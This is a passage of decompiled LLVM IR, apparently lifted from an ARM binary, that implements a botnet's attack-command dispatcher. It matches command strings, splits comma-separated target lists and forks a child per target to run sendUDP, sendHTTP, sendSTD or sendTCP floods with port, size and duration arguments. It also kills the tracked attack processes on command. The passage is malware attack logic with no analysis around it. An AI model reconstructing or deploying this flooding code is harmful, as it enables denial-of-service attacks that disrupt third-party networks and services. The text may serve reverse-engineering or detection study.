  %v1_211cc = inttoptr i32 %v1_211c8 to i32*
  %v2_211cc = load i32, i32* %v1_211cc, align 4
  store i32 %v2_211cc, i32* @r0, align 4
  %v1_211d4 = call i32 @atol(i32 %v2_211cc)
  br label %dec_label_pc_211e8

dec_label_pc_211e0:                               ; preds = %dec_label_pc_21138
  br label %dec_label_pc_211e8

dec_label_pc_211e8:                               ; preds = %dec_label_pc_211c4, %dec_label_pc_211e0
  %storemerge7 = phi i32 [ 10, %dec_label_pc_211e0 ], [ %v1_211d4, %dec_label_pc_211c4 ]
  store i32 %v2_21140, i32* @r0, align 4
  %v2_211fc = call i32 @__GI_strchr(i32 %v2_21140, i32 44)
  %v2_21204 = icmp eq i32 %v2_211fc, 0
  br i1 %v2_21204, label %dec_label_pc_21288, label %dec_label_pc_2120c

dec_label_pc_2120c:                               ; preds = %dec_label_pc_211e8
  %v2_21218 = call i32 @__GI_strtok(i32 %v2_21140, i32 ptrtoint (i32* @global_var_38ccc.2896 to i32))
  %v2_2127c26 = icmp eq i32 %v2_21218, 0
  br i1 %v2_2127c26, label %dec_label_pc_212c4, label %dec_label_pc_21228

dec_label_pc_21228:                               ; preds = %dec_label_pc_2120c, %dec_label_pc_21264
  %storemerge1627 = phi i32 [ %v2_2126c, %dec_label_pc_21264 ], [ %v2_21218, %dec_label_pc_2120c ]
  %v0_21228 = call i32 @listFork()
  %v2_21230 = icmp eq i32 %v0_21228, 0
  br i1 %v2_21230, label %dec_label_pc_21238, label %dec_label_pc_21264

dec_label_pc_21238:                               ; preds = %dec_label_pc_21228
  %v6_21258 = call i32 @sendUDP(i32 %storemerge1627, i32 %v1_21158, i32 %v1_21174, i32 %v1_21190, i32 %v1_211ac, i32 %storemerge7)
  %v1_21260 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_21264

dec_label_pc_21264:                               ; preds = %dec_label_pc_21228, %dec_label_pc_21238
  %v2_2126c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_38ccc.2896 to i32))
  %v2_2127c = icmp eq i32 %v2_2126c, 0
  br i1 %v2_2127c, label %dec_label_pc_212c4, label %dec_label_pc_21228

dec_label_pc_21288:                               ; preds = %dec_label_pc_211e8
  %v0_21288 = call i32 @listFork()
  %v2_21290 = icmp eq i32 %v0_21288, 0
  br i1 %v2_21290, label %dec_label_pc_21298, label %dec_label_pc_21a30

dec_label_pc_21298:                               ; preds = %dec_label_pc_21288
  %v6_212b8 = call i32 @sendUDP(i32 %v2_21140, i32 %v1_21158, i32 %v1_21174, i32 %v1_21190, i32 %v1_211ac, i32 %storemerge7)
  %v1_212c0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_212c4

dec_label_pc_212c4:                               ; preds = %dec_label_pc_21264, %dec_label_pc_2120c, %dec_label_pc_21014, %dec_label_pc_21298
  %v2_212c8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_38ee8.2971 to i32), i32* @r1, align 4
  %v3_212d4 = inttoptr i32 %v2_212c8 to i8*
  %v4_212d4 = call i32 @__GI_strcoll(i8* %v3_212d4, i32 ptrtoint ([5 x i8]* @global_var_38ee8.2971 to i32))
  %v2_212dc = icmp eq i32 %v4_212d4, 0
  br i1 %v2_212dc, label %dec_label_pc_212e4, label %dec_label_pc_214bc

dec_label_pc_212e4:                               ; preds = %dec_label_pc_212c4
  %v7_212ec = icmp slt i32 %arg1, 6
  br i1 %v7_212ec, label %dec_label_pc_21a30, label %dec_label_pc_212f0

dec_label_pc_212f0:                               ; preds = %dec_label_pc_212e4
  %v1_212f4 = add i32 %tmp, 4
  %v1_212f8 = inttoptr i32 %v1_212f4 to i32*
  %v2_212f8 = load i32, i32* %v1_212f8, align 4
  store i32 %v2_212f8, i32* @r0, align 4
  %v2_21304 = call i32 @__GI_strchr(i32 %v2_212f8, i32 44)
  %v2_2130c = icmp eq i32 %v2_21304, 0
  br i1 %v2_2130c, label %dec_label_pc_2140c, label %dec_label_pc_21314

dec_label_pc_21314:                               ; preds = %dec_label_pc_212f0
  %v2_2131c = load i32, i32* %v1_212f8, align 4
  %v2_21328 = call i32 @__GI_strtok(i32 %v2_2131c, i32 ptrtoint (i32* @global_var_38ccc.2896 to i32))
  %v2_2140024 = icmp eq i32 %v2_21328, 0
  br i1 %v2_2140024, label %dec_label_pc_214bc, label %dec_label_pc_21338.lr.ph

dec_label_pc_21338.lr.ph:                         ; preds = %dec_label_pc_21314
  %v1_21358 = add i32 %tmp, 8
  %v1_2135c = inttoptr i32 %v1_21358 to i32*
  %v1_21368 = add i32 %tmp, 12
  %v1_2136c = inttoptr i32 %v1_21368 to i32*
  %v1_21388 = add i32 %tmp, 16
  %v1_2138c = inttoptr i32 %v1_21388 to i32*
  %v1_21398 = add i32 %tmp, 20
  %v1_2139c = inttoptr i32 %v1_21398 to i32*
  %v1_213b0 = add i32 %tmp, 24
  %v1_213b4 = inttoptr i32 %v1_213b0 to i32*
  br label %dec_label_pc_21338

dec_label_pc_21338:                               ; preds = %dec_label_pc_21338.lr.ph, %dec_label_pc_213e8
  %v0_21338 = call i32 @listFork()
  %v2_21340 = icmp eq i32 %v0_21338, 0
  br i1 %v2_21340, label %dec_label_pc_21348, label %dec_label_pc_213e8

dec_label_pc_21348:                               ; preds = %dec_label_pc_21338
  %v2_21350 = load i32, i32* %v1_212f8, align 4
  store i32 %v2_21350, i32* @r5, align 4
  %v2_2135c = load i32, i32* %v1_2135c, align 4
  store i32 %v2_2135c, i32* @r6, align 4
  %v2_2136c = load i32, i32* %v1_2136c, align 4
  store i32 %v2_2136c, i32* @r0, align 4
  %v1_21374 = call i32 @atol(i32 %v2_2136c)
  %v3_21380 = urem i32 %v1_21374, 65536
  store i32 %v3_21380, i32* @r7, align 4
  %v2_2138c = load i32, i32* %v1_2138c, align 4
  store i32 %v2_2138c, i32* @r8, align 4
  %v2_2139c = load i32, i32* %v1_2139c, align 4
  store i32 %v2_2139c, i32* @r0, align 4
  %v1_213a4 = call i32 @atol(i32 %v2_2139c)
  store i32 %v1_213a4, i32* @r4, align 4
  %v2_213b4 = load i32, i32* %v1_213b4, align 4
  store i32 %v2_213b4, i32* @r0, align 4
  %v1_213bc = call i32 @atol(i32 %v2_213b4)
  %v0_213c4 = load i32, i32* @r4, align 4
  %v0_213cc = load i32, i32* @r5, align 4
  %v0_213d0 = load i32, i32* @r6, align 4
  %v0_213d4 = load i32, i32* @r7, align 4
  %v0_213d8 = load i32, i32* @r8, align 4
  %v6_213dc = trunc i32 %v0_213d4 to i16
  %v7_213dc = call i32 @sendHTTP(i32 %v0_213cc, i32 %v0_213d0, i16 %v6_213dc, i32 %v0_213d8, i32 %v0_213c4, i32 %v1_213bc)
  %v1_213e4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_213e8

dec_label_pc_213e8:                               ; preds = %dec_label_pc_21338, %dec_label_pc_21348
  %v2_213f0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_38ccc.2896 to i32))
  %v2_21400 = icmp eq i32 %v2_213f0, 0
  br i1 %v2_21400, label %dec_label_pc_214bc, label %dec_label_pc_21338

dec_label_pc_2140c:                               ; preds = %dec_label_pc_212f0
  %v0_2140c = call i32 @listFork()
  %v2_21414 = icmp eq i32 %v0_2140c, 0
  br i1 %v2_21414, label %dec_label_pc_2141c, label %dec_label_pc_21a30

dec_label_pc_2141c:                               ; preds = %dec_label_pc_2140c
  %v2_21424 = load i32, i32* %v1_212f8, align 4
  store i32 %v2_21424, i32* @r5, align 4
  %v1_2142c = add i32 %tmp, 8
  %v1_21430 = inttoptr i32 %v1_2142c to i32*
  %v2_21430 = load i32, i32* %v1_21430, align 4
  store i32 %v2_21430, i32* @r6, align 4
  %v1_2143c = add i32 %tmp, 12
  %v1_21440 = inttoptr i32 %v1_2143c to i32*
  %v2_21440 = load i32, i32* %v1_21440, align 4
  store i32 %v2_21440, i32* @r0, align 4
  %v1_21448 = call i32 @atol(i32 %v2_21440)
  %v3_21454 = urem i32 %v1_21448, 65536
  store i32 %v3_21454, i32* @r7, align 4
  %v1_2145c = add i32 %tmp, 16
  %v1_21460 = inttoptr i32 %v1_2145c to i32*
  %v2_21460 = load i32, i32* %v1_21460, align 4
  store i32 %v2_21460, i32* @r8, align 4
  %v1_2146c = add i32 %tmp, 20
  %v1_21470 = inttoptr i32 %v1_2146c to i32*
  %v2_21470 = load i32, i32* %v1_21470, align 4
  store i32 %v2_21470, i32* @r0, align 4
  %v1_21478 = call i32 @atol(i32 %v2_21470)
  store i32 %v1_21478, i32* @r4, align 4
  %v1_21484 = add i32 %tmp, 24
  %v1_21488 = inttoptr i32 %v1_21484 to i32*
  %v2_21488 = load i32, i32* %v1_21488, align 4
  store i32 %v2_21488, i32* @r0, align 4
  %v1_21490 = call i32 @atol(i32 %v2_21488)
  %v0_21498 = load i32, i32* @r4, align 4
  %v0_214a0 = load i32, i32* @r5, align 4
  %v0_214a4 = load i32, i32* @r6, align 4
  %v0_214a8 = load i32, i32* @r7, align 4
  %v0_214ac = load i32, i32* @r8, align 4
  %v6_214b0 = trunc i32 %v0_214a8 to i16
  %v7_214b0 = call i32 @sendHTTP(i32 %v0_214a0, i32 %v0_214a4, i16 %v6_214b0, i32 %v0_214ac, i32 %v0_21498, i32 %v1_21490)
  %v1_214b8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_214bc

dec_label_pc_214bc:                               ; preds = %dec_label_pc_213e8, %dec_label_pc_21314, %dec_label_pc_212c4, %dec_label_pc_2141c
  %v2_214c0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_38ef0.2973 to i32), i32* @r1, align 4
  %v3_214cc = inttoptr i32 %v2_214c0 to i8*
  %v4_214cc = call i32 @__GI_strcoll(i8* %v3_214cc, i32 ptrtoint ([4 x i8]* @global_var_38ef0.2973 to i32))
  %v2_214d4 = icmp eq i32 %v4_214cc, 0
  br i1 %v2_214d4, label %dec_label_pc_214dc, label %dec_label_pc_21620

dec_label_pc_214dc:                               ; preds = %dec_label_pc_214bc
  %v7_214e4 = icmp slt i32 %arg1, 4
  br i1 %v7_214e4, label %dec_label_pc_21a30, label %dec_label_pc_214e8

dec_label_pc_214e8:                               ; preds = %dec_label_pc_214dc
  %v1_214ec = add i32 %tmp, 8
  %v1_214f0 = inttoptr i32 %v1_214ec to i32*
  %v2_214f0 = load i32, i32* %v1_214f0, align 4
  store i32 %v2_214f0, i32* @r0, align 4
  %v1_214f8 = call i32 @atol(i32 %v2_214f0)
  %tmp75 = icmp slt i32 %v1_214f8, 1
  br i1 %tmp75, label %dec_label_pc_21a30, label %dec_label_pc_21508

dec_label_pc_21508:                               ; preds = %dec_label_pc_214e8
  %v1_2150c = add i32 %tmp, 12
  %v1_21510 = inttoptr i32 %v1_2150c to i32*
  %v2_21510 = load i32, i32* %v1_21510, align 4
  store i32 %v2_21510, i32* @r0, align 4
  %v1_21518 = call i32 @atol(i32 %v2_21510)
  %v5_21524 = icmp sgt i32 %v1_21518, 0
  br i1 %v5_21524, label %dec_label_pc_2152c, label %dec_label_pc_21a30

dec_label_pc_2152c:                               ; preds = %dec_label_pc_21508
  %v1_21530 = add i32 %tmp, 4
  %v1_21534 = inttoptr i32 %v1_21530 to i32*
  %v2_21534 = load i32, i32* %v1_21534, align 4
  %v2_21544 = load i32, i32* %v1_214f0, align 4
  store i32 %v2_21544, i32* @r0, align 4
  %v1_2154c = call i32 @atol(i32 %v2_21544)
  %v2_21560 = load i32, i32* %v1_21510, align 4
  store i32 %v2_21560, i32* @r0, align 4
  %v1_21568 = call i32 @atol(i32 %v2_21560)
  store i32 %v2_21534, i32* @r0, align 4
  %v2_21580 = call i32 @__GI_strchr(i32 %v2_21534, i32 44)
  %v2_21588 = icmp eq i32 %v2_21580, 0
  br i1 %v2_21588, label %dec_label_pc_215f8, label %dec_label_pc_21590

dec_label_pc_21590:                               ; preds = %dec_label_pc_2152c
  %v2_2159c = call i32 @__GI_strtok(i32 %v2_21534, i32 ptrtoint (i32* @global_var_38ccc.2896 to i32))
  %v2_215ec21 = icmp eq i32 %v2_2159c, 0
  br i1 %v2_215ec21, label %dec_label_pc_21620, label %dec_label_pc_215ac

dec_label_pc_215ac:                               ; preds = %dec_label_pc_21590, %dec_label_pc_215d4
  %storemerge1222 = phi i32 [ %v2_215dc, %dec_label_pc_215d4 ], [ %v2_2159c, %dec_label_pc_21590 ]
  %v0_215ac = call i32 @listFork()
  %v2_215b4 = icmp eq i32 %v0_215ac, 0
  br i1 %v2_215b4, label %dec_label_pc_215bc, label %dec_label_pc_215d4

dec_label_pc_215bc:                               ; preds = %dec_label_pc_215ac
  %v4_215c8 = call i32 @sendSTD(i32 %storemerge1222, i32 %v1_2154c, i32 %v1_21568, i32 0)
  %v1_215d0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_215d4

dec_label_pc_215d4:                               ; preds = %dec_label_pc_215ac, %dec_label_pc_215bc
  %v2_215dc = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_38ccc.2896 to i32))
  %v2_215ec = icmp eq i32 %v2_215dc, 0
  br i1 %v2_215ec, label %dec_label_pc_21620, label %dec_label_pc_215ac

dec_label_pc_215f8:                               ; preds = %dec_label_pc_2152c
  %v0_215f8 = call i32 @listFork()
  %v2_21600 = icmp eq i32 %v0_215f8, 0
  br i1 %v2_21600, label %dec_label_pc_21608, label %dec_label_pc_21a30

dec_label_pc_21608:                               ; preds = %dec_label_pc_215f8
  %v4_21614 = call i32 @sendSTD(i32 %v2_21534, i32 %v1_2154c, i32 %v1_21568, i32 0)
  %v1_2161c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_21620

dec_label_pc_21620:                               ; preds = %dec_label_pc_215d4, %dec_label_pc_21590, %dec_label_pc_214bc, %dec_label_pc_21608
  %v2_21624 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_38ef4.2975 to i32), i32* @r1, align 4
  %v3_21630 = inttoptr i32 %v2_21624 to i8*
  %v4_21630 = call i32 @__GI_strcoll(i8* %v3_21630, i32 ptrtoint ([4 x i8]* @global_var_38ef4.2975 to i32))
  %v2_21638 = icmp eq i32 %v4_21630, 0
  br i1 %v2_21638, label %dec_label_pc_21640, label %dec_label_pc_218f0

dec_label_pc_21640:                               ; preds = %dec_label_pc_21620
  %v7_21648 = icmp slt i32 %arg1, 6
  br i1 %v7_21648, label %dec_label_pc_21a30, label %dec_label_pc_2164c

dec_label_pc_2164c:                               ; preds = %dec_label_pc_21640
  %v1_21650 = add i32 %tmp, 12
  %v1_21654 = inttoptr i32 %v1_21650 to i32*
  %v2_21654 = load i32, i32* %v1_21654, align 4
  store i32 %v2_21654, i32* @r0, align 4
  %v1_2165c = call i32 @atol(i32 %v2_21654)
  %v7_21664 = icmp eq i32 %v1_2165c, -1
  br i1 %v7_21664, label %dec_label_pc_21a30, label %dec_label_pc_2166c

dec_label_pc_2166c:                               ; preds = %dec_label_pc_2164c
  %v1_21670 = add i32 %tmp, 8
  %v1_21674 = inttoptr i32 %v1_21670 to i32*
  %v2_21674 = load i32, i32* %v1_21674, align 4
  store i32 %v2_21674, i32* @r0, align 4
  %v1_2167c = call i32 @atol(i32 %v2_21674)
  %v7_21684 = icmp eq i32 %v1_2167c, -1
  br i1 %v7_21684, label %dec_label_pc_21a30, label %dec_label_pc_2168c

dec_label_pc_2168c:                               ; preds = %dec_label_pc_2166c
  %v1_21690 = add i32 %tmp, 16
  %v1_21694 = inttoptr i32 %v1_21690 to i32*
  %v2_21694 = load i32, i32* %v1_21694, align 4
  store i32 %v2_21694, i32* @r0, align 4
  %v1_2169c = call i32 @atol(i32 %v2_21694)
  %v7_216a4 = icmp eq i32 %v1_2169c, -1
  br i1 %v7_216a4, label %dec_label_pc_21a30, label %dec_label_pc_216ac

dec_label_pc_216ac:                               ; preds = %dec_label_pc_2168c
  %v2_216b4 = load i32, i32* %v1_21694, align 4
  store i32 %v2_216b4, i32* @r0, align 4
  %v1_216bc = call i32 @atol(i32 %v2_216b4)
  %v8_216c8 = icmp sgt i32 %v1_216bc, 32
  br i1 %v8_216c8, label %dec_label_pc_21a30, label %dec_label_pc_216cc

dec_label_pc_216cc:                               ; preds = %dec_label_pc_216ac
  %v7_216d4 = icmp slt i32 %arg1, 7
  br i1 %v7_216d4, label %dec_label_pc_216f8, label %dec_label_pc_216d8

dec_label_pc_216d8:                               ; preds = %dec_label_pc_216cc
  %v1_216dc = add i32 %tmp, 24
  %v1_216e0 = inttoptr i32 %v1_216dc to i32*
  %v2_216e0 = load i32, i32* %v1_216e0, align 4
  store i32 %v2_216e0, i32* @r0, align 4
  %v1_216e8 = call i32 @atol(i32 %v2_216e0)
  %v1_216f0 = icmp slt i32 %v1_216e8, 0
  br i1 %v1_216f0, label %dec_label_pc_21a30, label %dec_label_pc_216f8

dec_label_pc_216f8:                               ; preds = %dec_label_pc_216d8, %dec_label_pc_216cc
  %v7_216fc = icmp eq i32 %arg1, 8
  br i1 %v7_216fc, label %dec_label_pc_21704, label %dec_label_pc_21728

dec_label_pc_21704:                               ; preds = %dec_label_pc_216f8
  %v1_21708 = add i32 %tmp, 28
  %v1_2170c = inttoptr i32 %v1_21708 to i32*
  %v2_2170c = load i32, i32* %v1_2170c, align 4
  store i32 %v2_2170c, i32* @r0, align 4
  %v1_21714 = call i32 @atol(i32 %v2_2170c)
  %v5_21720 = icmp sgt i32 %v1_21714, 0
  br i1 %v5_21720, label %dec_label_pc_21728, label %dec_label_pc_21a30

dec_label_pc_21728:                               ; preds = %dec_label_pc_216f8, %dec_label_pc_21704
  %v1_2172c = add i32 %tmp, 4
  %v1_21730 = inttoptr i32 %v1_2172c to i32*
  %v2_21730 = load i32, i32* %v1_21730, align 4
  %v2_21740 = load i32, i32* %v1_21674, align 4
  store i32 %v2_21740, i32* @r0, align 4
  %v1_21748 = call i32 @atol(i32 %v2_21740)
  %v2_2175c = load i32, i32* %v1_21654, align 4
  store i32 %v2_2175c, i32* @r0, align 4
  %v1_21764 = call i32 @atol(i32 %v2_2175c)
  %v2_21778 = load i32, i32* %v1_21694, align 4
  store i32 %v2_21778, i32* @r0, align 4
  %v1_21780 = call i32 @atol(i32 %v2_21778)
  %v1_21790 = add i32 %tmp, 20
  %v1_21794 = inttoptr i32 %v1_21790 to i32*
  %v2_21794 = load i32, i32* %v1_21794, align 4
  br i1 %v7_216fc, label %dec_label_pc_217a8, label %dec_label_pc_217c4

dec_label_pc_217a8:                               ; preds = %dec_label_pc_21728
  %v1_217ac = add i32 %tmp, 28
  %v1_217b0 = inttoptr i32 %v1_217ac to i32*
  %v2_217b0 = load i32, i32* %v1_217b0, align 4
  store i32 %v2_217b0, i32* @r0, align 4
  %v1_217b8 = call i32 @atol(i32 %v2_217b0)
  br label %dec_label_pc_217cc

dec_label_pc_217c4:                               ; preds = %dec_label_pc_21728
  br label %dec_label_pc_217cc

dec_label_pc_217cc:                               ; preds = %dec_label_pc_217a8, %dec_label_pc_217c4
  %storemerge3 = phi i32 [ 10, %dec_label_pc_217c4 ], [ %v1_217b8, %dec_label_pc_217a8 ]
  br i1 %v7_216d4, label %dec_label_pc_217fc, label %dec_label_pc_217e0

dec_label_pc_217e0:                               ; preds = %dec_label_pc_217cc
  %v1_217e4 = add i32 %tmp, 24
  %v1_217e8 = inttoptr i32 %v1_217e4 to i32*
  %v2_217e8 = load i32, i32* %v1_217e8, align 4
  store i32 %v2_217e8, i32* @r0, align 4
  %v1_217f0 = call i32 @atol(i32 %v2_217e8)
  br label %dec_label_pc_21804

dec_label_pc_217fc:                               ; preds = %dec_label_pc_217cc
  br label %dec_label_pc_21804

dec_label_pc_21804:                               ; preds = %dec_label_pc_217e0, %dec_label_pc_217fc
  %storemerge2 = phi i32 [ 0, %dec_label_pc_217fc ], [ %v1_217f0, %dec_label_pc_217e0 ]
  store i32 %v2_21730, i32* @r0, align 4
  %v2_21818 = call i32 @__GI_strchr(i32 %v2_21730, i32 44)
  %v2_21820 = icmp eq i32 %v2_21818, 0
  br i1 %v2_21820, label %dec_label_pc_218ac, label %dec_label_pc_21828

dec_label_pc_21828:                               ; preds = %dec_label_pc_21804
  %v2_21834 = call i32 @__GI_strtok(i32 %v2_21730, i32 ptrtoint (i32* @global_var_38ccc.2896 to i32))
  %v2_218a018 = icmp eq i32 %v2_21834, 0
  br i1 %v2_218a018, label %dec_label_pc_218f0, label %dec_label_pc_21844

dec_label_pc_21844:                               ; preds = %dec_label_pc_21828, %dec_label_pc_21888
  %storemerge1019 = phi i32 [ %v2_21890, %dec_label_pc_21888 ], [ %v2_21834, %dec_label_pc_21828 ]
  %v0_21844 = call i32 @listFork()
  %v2_2184c = icmp eq i32 %v0_21844, 0
  br i1 %v2_2184c, label %dec_label_pc_21854, label %dec_label_pc_21888

dec_label_pc_21854:                               ; preds = %dec_label_pc_21844
  %v7_2187c = call i32 @sendTCP(i32 %storemerge1019, i32 %v1_21748, i32 %v1_21764, i32 %v1_21780, i32 %v2_21794, i32 %storemerge2, i32 %storemerge3)
  %v1_21884 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_21888

dec_label_pc_21888:                               ; preds = %dec_label_pc_21844, %dec_label_pc_21854
  %v2_21890 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_38ccc.2896 to i32))
  %v2_218a0 = icmp eq i32 %v2_21890, 0
  br i1 %v2_218a0, label %dec_label_pc_218f0, label %dec_label_pc_21844

dec_label_pc_218ac:                               ; preds = %dec_label_pc_21804
  %v0_218ac = call i32 @listFork()
  %v2_218b4 = icmp eq i32 %v0_218ac, 0
  br i1 %v2_218b4, label %dec_label_pc_218bc, label %dec_label_pc_21a30

dec_label_pc_218bc:                               ; preds = %dec_label_pc_218ac
  %v7_218e4 = call i32 @sendTCP(i32 %v2_21730, i32 %v1_21748, i32 %v1_21764, i32 %v1_21780, i32 %v2_21794, i32 %storemerge2, i32 %storemerge3)
  %v1_218ec = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_218f0

dec_label_pc_218f0:                               ; preds = %dec_label_pc_21888, %dec_label_pc_21828, %dec_label_pc_21620, %dec_label_pc_218bc
  %v2_218f4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_38ef8.2977 to i32), i32* @r1, align 4
  %v3_21900 = inttoptr i32 %v2_218f4 to i8*
  %v4_21900 = call i32 @__GI_strcoll(i8* %v3_21900, i32 ptrtoint ([5 x i8]* @global_var_38ef8.2977 to i32))
  %v2_21908 = icmp eq i32 %v4_21900, 0
  br i1 %v2_21908, label %dec_label_pc_21910, label %dec_label_pc_21a08

dec_label_pc_21910:                               ; preds = %dec_label_pc_218f0
  br label %dec_label_pc_219b4

dec_label_pc_21924:                               ; preds = %dec_label_pc_219b4, %dec_label_pc_219e8
  %v3_21928 = mul i32 %storemerge8, 4
  %v2_21934 = load i32, i32* @global_var_49990.72, align 4
  %v2_21938 = add i32 %v2_21934, %v3_21928
  %v1_2193c = inttoptr i32 %v2_21938 to i32*
  %v2_2193c = load i32, i32* %v1_2193c, align 4
  %v2_21940 = icmp eq i32 %v2_2193c, 0
  br i1 %v2_21940, label %dec_label_pc_219a8, label %dec_label_pc_21948

dec_label_pc_21948:                               ; preds = %dec_label_pc_21924
  %v2_21960 = load i32, i32* %v1_2193c, align 4
  %v0_21964 = call i32 @__getpid()
  %v9_2196c = icmp eq i32 %v2_21960, %v0_21964
  br i1 %v9_2196c, label %dec_label_pc_219a8, label %dec_label_pc_21974

dec_label_pc_21974:                               ; preds = %dec_label_pc_21948
  %v2_21984 = load i32, i32* @global_var_49990.72, align 4
  %v2_21988 = add i32 %v2_21984, %v3_21928
  %v1_2198c = inttoptr i32 %v2_21988 to i32*
  %v2_2198c = load i32, i32* %v1_2198c, align 4
  %v2_21998 = call i32 @kill(i32 %v2_2198c, i32 9)
  %v1_219a0 = add i32 %stack_var_-48.1, 1
  br label %dec_label_pc_219a8

dec_label_pc_219a8:                               ; preds = %dec_label_pc_21948, %dec_label_pc_21924, %dec_label_pc_21974
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.1, %dec_label_pc_21924 ], [ %stack_var_-48.1, %dec_label_pc_21948 ], [ %v1_219a0, %dec_label_pc_21974 ]
  %v1_219ac = add i32 %storemerge8, 1
  br label %dec_label_pc_219b4

dec_label_pc_219b4:                               ; preds = %dec_label_pc_21910, %dec_label_pc_219a8
  %stack_var_-48.1 = phi i32 [ 0, %dec_label_pc_21910 ], [ %stack_var_-48.0, %dec_label_pc_219a8 ]
  %storemerge8 = phi i32 [ 0, %dec_label_pc_21910 ], [ %v1_219ac, %dec_label_pc_219a8 ]
  %v5_219cc = load i32, i32* @global_var_42c6c.70, align 4
  %v9_219e0 = icmp eq i32 %v5_219cc, 0
  br i1 %v9_219e0, label %dec_label_pc_219e8, label %dec_label_pc_21924

dec_label_pc_219e8:                               ; preds = %dec_label_pc_219b4
  %v2_219cc = load i32, i32* @global_var_42c68.69, align 4
  %tmp76 = icmp ugt i32 %v2_219cc, %storemerge8
  br i1 %tmp76, label %dec_label_pc_21924, label %dec_label_pc_21a08

dec_label_pc_21a08:                               ; preds = %dec_label_pc_219e8, %dec_label_pc_218f0
  %v2_21a0c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_38f00.2981 to i32), i32* @r1, align 4
  %v3_21a18 = inttoptr i32 %v2_21a0c to i8*
  %v4_21a18 = call i32 @__GI_strcoll(i8* %v3_21a18, i32 ptrtoint ([12 x i8]* @global_var_38f00.2981 to i32))
  %v2_21a20 = icmp eq i32 %v4_21a18, 0
  br i1 %v2_21a20, label %dec_label_pc_21a28, label %dec_label_pc_21a30

dec_label_pc_21a28:                               ; preds = %dec_label_pc_21a08
  %v1_21a2c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_21a30

dec_label_pc_21a30:                               ; preds = %dec_label_pc_21704, %dec_label_pc_21508, %dec_label_pc_21114, %dec_label_pc_21288, %dec_label_pc_2140c, %dec_label_pc_215f8, %dec_label_pc_218ac, %dec_label_pc_21a08, %dec_label_pc_20fc4, %dec_label_pc_216d8, %dec_label_pc_216ac, %dec_label_pc_2168c, %dec_label_pc_2166c, %dec_label_pc_2164c, %dec_label_pc_21640, %dec_label_pc_214e8, %dec_label_pc_214dc, %dec_label_pc_212e4, %dec_label_pc_210e8, %dec_label_pc_210c0, %dec_label_pc_210a0, %dec_label_pc_21080, %dec_label_pc_21060, %dec_label_pc_21040, %dec_label_pc_21034, %dec_label_pc_20f5c, %dec_label_pc_20fec, %dec_label_pc_20f20, %dec_label_pc_20d04, %dec_label_pc_20cac, %dec_label_pc_20c74, %dec_label_pc_21a28
  %v1_21a38 = phi i32 [ %v1_21714, %dec_label_pc_21704 ], [ %v1_21518, %dec_label_pc_21508 ], [ %v1_21124, %dec_label_pc_21114 ], [ %v0_21288, %dec_label_pc_21288 ], [ %v0_2140c, %dec_label_pc_2140c ], [ %v0_215f8, %dec_label_pc_215f8 ], [ %v0_218ac, %dec_label_pc_218ac ], [ %v4_21a18, %dec_label_pc_21a08 ], [ 0, %dec_label_pc_20fc4 ], [ %v1_216e8, %dec_label_pc_216d8 ], [ %v1_216bc, %dec_label_pc_216ac ], [ %v1_2169c, %dec_label_pc_2168c ], [ %v1_2167c, %dec_label_pc_2166c ], [ %v1_2165c, %dec_label_pc_2164c ], [ 0, %dec_label_pc_21640 ], [ %v1_214f8, %dec_label_pc_214e8 ], [ 0, %dec_label_pc_214dc ], [ 0, %dec_label_pc_212e4 ], [ %v1_210f8, %dec_label_pc_210e8 ], [ %v1_210d0, %dec_label_pc_210c0 ], [ %v1_210b0, %dec_label_pc_210a0 ], [ %v1_21090, %dec_label_pc_21080 ], [ %v1_21070, %dec_label_pc_21060 ], [ %v1_21050, %dec_label_pc_21040 ], [ 0, %dec_label_pc_21034 ], [ 0, %dec_label_pc_20f5c ], [ %v0_20fd4, %dec_label_pc_20fec ], [ %v3_20f30, %dec_label_pc_20f20 ], [ %v3_20d14, %dec_label_pc_20d04 ], [ %v3_20cd0, %dec_label_pc_20cac ], [ %v3_20c84, %dec_label_pc_20c74 ], [ %v1_21a2c, %dec_label_pc_21a28 ]
  store i32 %v3_20c40, i32* @r4, align 4
  store i32 %v6_20c40, i32* @r5, align 4
  store i32 %v9_20c40, i32* @r6, align 4
  store i32 %v12_20c40, i32* @r7, align 4
  store i32 %v15_20c40, i32* @r8, align 4
  store i32 %v18_20c40, i32* @fp, align 4
  ret i32 %v1_21a38

; uselistorder directives
  uselistorder i32 %stack_var_-48.1, { 0, 2, 1 }
  uselistorder i32 %v3_21928, { 1, 0 }
  uselistorder i32 %v2_21890, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v1_21780, { 1, 0 }
  uselistorder i32 %v1_21764, { 1, 0 }
  uselistorder i32 %v1_21748, { 1, 0 }
  uselistorder i32 %v2_21730, { 1, 0, 3, 2 }
  uselistorder i32 %v1_2169c, { 1, 0 }
  uselistorder i32 %v1_2167c, { 1, 0 }
  uselistorder i32 %v1_2165c, { 1, 0 }
  uselistorder i32 %v2_215dc, { 1, 0 }
  uselistorder i32 %v1_21568, { 1, 0 }
  uselistorder i32 %v1_2154c, { 1, 0 }
  uselistorder i32 %v2_21534, { 1, 0, 3, 2 }
  uselistorder i32* %v1_212f8, { 2, 0, 1, 3 }
  uselistorder i32 %v2_2126c, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v1_21190, { 1, 0 }
  uselistorder i32 %v1_21174, { 1, 0 }
